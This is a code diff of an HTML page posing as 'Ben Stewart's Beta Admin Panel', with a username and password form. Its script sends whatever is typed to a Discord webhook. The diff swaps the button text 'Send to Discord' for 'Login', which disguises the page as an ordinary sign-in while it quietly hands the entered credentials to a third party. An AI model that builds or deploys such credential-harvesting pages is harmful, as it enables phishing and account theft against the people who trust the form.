@@ -14,7 +14,7 @@
 
             // Prepare the payload to send
             const payload = {
-                content: `Textbox 1: ${Username}\nTextbox 2: ${Password}`
+                content: `Textbox 1: ${textbox1}\nTextbox 2: ${textbox2}`
             };
 
             // Send the POST request to the Discord webhook
@@ -38,7 +38,7 @@
     </script>
 </head>
 <body>
-    <h2>Ben Stewart's Beta Admin Panel2</h2>
+    <h2>Ben Stewart's Beta Admin Panel</h2>
     <form onsubmit="event.preventDefault(); sendToWebhook();">
         <label for="textbox1">Username:</label><br>
         <input type="text" id="textbox1" name="textbox1" required><br><br>
@@ -46,7 +46,7 @@
         <label for="textbox2">Password:</label><br>
         <input type="text" id="textbox2" name="textbox2" required><br><br>
 
-        <button type="submit">Send to Discord</button>
+        <button type="submit">Login</button>
     </form>
 </body>
 </html>
